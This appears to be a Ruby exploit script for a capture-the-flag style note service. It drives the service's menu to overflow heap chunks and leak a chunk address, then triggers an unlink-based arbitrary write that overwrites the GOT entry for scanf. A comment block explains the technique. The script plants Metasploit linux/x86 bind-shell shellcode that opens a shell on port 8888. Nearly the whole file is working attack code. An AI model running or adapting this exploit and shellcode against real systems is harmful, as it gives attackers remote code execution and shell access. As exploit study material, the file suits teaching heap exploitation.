require 'socket'
require 'hexdump'

host = ARGV[0] || '127.0.0.1'
port = (ARGV[1] || 8976).to_i

$ci = 0

def read_menu(sock)
	sleep 1
	sock.recv(100000)
	#puts sock.recv(1000)
end

def read_junk(sock)
	sleep 1
	sock.recv(200)
end

def chunk_alloc(sock, size)
	sock.puts("1")	# add note
	read_junk(sock)
	sock.puts("%d" % [size])
	read_menu(sock)
	ret = $ci
	$ci += 1
	return ret
end

def chunk_write(sock, cid, data)
	sock.puts("3")	# change note
	read_junk(sock)
	sock.puts("%d" % [cid])	# note id
	read_junk(sock)
	sock.puts("%d" % [data.size])	# size
	read_junk(sock)
	sock.send(data, 0)
	read_menu(sock)
end

def chunk_read(sock, cid, rsize)
	sock.puts("4")
	read_junk(sock)
	sock.puts("%d" % [cid])	# note id
	data = sock.recv(rsize)
	read_menu(sock)
	return data
end

def chunk_free(sock, cid)
	sock.puts("2")	# remove note
	read_junk(sock)
	sock.puts("%d" % [cid])
	read_menu(sock)
end

# linux/x86/shell_bind_tcp - 78 bytes
# http://www.metasploit.com
# VERBOSE=false, LPORT=8888, RHOST=, PrependFork=false, 
# PrependSetresuid=false, PrependSetreuid=false, 
# PrependSetuid=false, PrependSetresgid=false, 
# PrependSetregid=false, PrependSetgid=false, 
# PrependChrootBreak=false, AppendExit=false, 
# InitialAutoRunScript=, AutoRunScript=
payload = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd" +
"\x80\x5b\x5e\x52\x68\x02\x00\x22\xb8\x6a\x10\x51\x50\x89" +
"\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd" +
"\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49" +
"\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3" +
"\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# shellcode+8 will be overwritten during chunk unlink (free)
#payload = "\xcc" * 100
jmp = "\xeb" + [10].pack('C')
shellcode = jmp + "NNNNNN" + "JUNK" + payload

if __FILE__ == $0
	where = 0x45454545; where = 0x0804a018 # 0804a018 R_386_JUMP_SLOT   __isoc99_scanf
	what = 0x49494949	# doesn't matter, we will leak it
	off = 108
	csize = 100

	sock = TCPSocket.new(host, port)
	read_menu(sock)

=begin
	Chunk Format:
		[size]
		[next ptr]
		[prev ptr]
		[data]

	We will allocate 4 chunks:
		[c1-100][c2-100][c3-100][c4-sizeof_shellcode]

	We will overflow c2 and overwrite c3 [size] field containing 0x00
	We will read c2 and leak prev and next ptr from c3 (puts)
	next ptr from c3 will leak us the address of c4
	We will put shellcode in c4
	We will overflow c1 and overwrite header pointers in c2
	We will free c2 to trigger an AA4BMO
	We will gain code execution by overwriting GOT.PLT function ptr
=end

	puts "Allocating chunks"; #$stdin.gets
	c1 = chunk_alloc(sock, csize); #$stdin.gets
	c2 = chunk_alloc(sock, csize); #$stdin.gets
	c3 = chunk_alloc(sock, csize)
	c4 = chunk_alloc(sock, shellcode.size + 100)

	puts "Chunks allocated: [%d %d %d %d]" % [c1, c2, c3, c4]

	puts "Attempting info leak"
	# Overwrite chunk3 headers in order to leak chunk4 addr
	# while trying to read chunk2
	chunk_write(sock, c2, "A" * (0x6c + 4))
	data = chunk_read(sock, c2, (0x6c + 4 + 8))
	Hexdump.dump(data)
	
	sc_chunk_addr = data[-8, 4].unpack('V').first()
	sc_chunk_addr += 12	# skip chunk header

	puts "Chunk4 addr leaked: 0x%08x" % [sc_chunk_addr]
	what = sc_chunk_addr
	$stdin.gets

	puts "Writing shellcode"
	chunk_write(sock, c4, shellcode)

	puts "Overflowing Chunk1"; #$stdin.gets
	
	buf = "A" * 200
	buf[off + 8, 4] = [where - 4].pack('V')
	buf[off + 4, 4] = [what].pack('V')

	chunk_write(sock, c1, buf);

	puts "Free'ing Chunk2"; #$stdin.gets
	chunk_free(sock, c2)

	sock.close
	puts "Done"
end
